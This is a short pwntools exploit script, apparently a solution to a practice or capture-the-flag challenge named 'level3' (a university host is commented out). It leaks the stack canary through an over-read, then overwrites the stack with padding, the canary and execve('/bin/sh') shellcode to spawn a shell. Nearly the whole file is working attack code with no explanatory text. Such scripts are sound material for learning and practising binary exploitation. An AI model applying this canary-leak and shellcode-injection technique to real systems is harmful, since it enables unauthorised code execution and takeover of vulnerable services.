from pwn import *

# port = 10007
# rem = remote("kayle.snu.ac.kr", port)
rem = process("./level3/problem/level3")
# gdb.attach(rem)

elf = ELF("./level3/problem/level3")
lib = ELF('./level3/problem/libc.so.6')

rem.recvline()

payload = b'A' * 0x49
rem.send(payload)
rem.recvuntil(payload)
canary = u64(b'\x00' +rem.recvn(7))
print(hex(canary))

payload = b'B' * 0x68
rem.send(payload)
rem.recvuntil(payload)
# lib_base = u64(rem.recvn(6) + b'\x00' * 2) + 48 - lib.symbols['__libc_start_main']
# gadget_addr = lib_base + 0xebd38
# print(hex(lib_base))

shellcode = shellcraft.execve("/bin/sh", 0 ,0)
print(asm(shellcode))
payload = b'C' * 0x28 + p64(canary) + b'C' * 0x8 + bytes(asm(shellcode))
rem.recvuntil(b'comment: ')
rem.send(payload)
rem.recvline()

# rem.interactive()